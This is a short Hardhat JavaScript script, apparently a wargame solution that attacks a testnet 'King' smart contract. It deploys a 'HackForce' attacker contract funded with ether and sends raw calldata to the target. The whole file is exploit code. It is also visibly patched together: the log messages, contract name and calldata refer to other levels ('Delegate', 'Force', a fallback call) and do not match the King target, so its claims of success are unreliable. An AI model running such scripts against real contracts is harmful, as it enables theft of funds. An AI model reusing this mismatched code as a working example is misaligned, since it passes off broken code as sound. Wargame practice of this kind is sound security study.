require("dotenv").config();

const provider = new hre.ethers.providers.JsonRpcProvider( process.env.RINKEBY_URL );
const wallet = new hre.ethers.Wallet( process.env.PRIVATE_KEY, provider );

const main = async () => {
  const kingAbi = await hre.artifacts.readArtifact("King");
  const kingContract = await new hre.ethers.Contract("0x728a90D5dF447c3298786985b24Af810cb4Cde71", kingAbi.abi, wallet);
  console.log("Delegate contract: " + kingContract.address);

  const hackKingFactory = await hre.ethers.getContractFactory("HackForce");
  const hackKingContract = await hackKingFactory.deploy('0x2A6Aec7F39856Efc74544a53601d228Eb5c43698', {value: 1000});
  await hackKingContract.deployed();

  await wallet.sendTransaction({
    to: kingContract.address,
    from: wallet.address,
    data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000",
    gasLimit: "100000"
  });
  console.log("Fallback function successfully called.");
}

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
};

runMain();
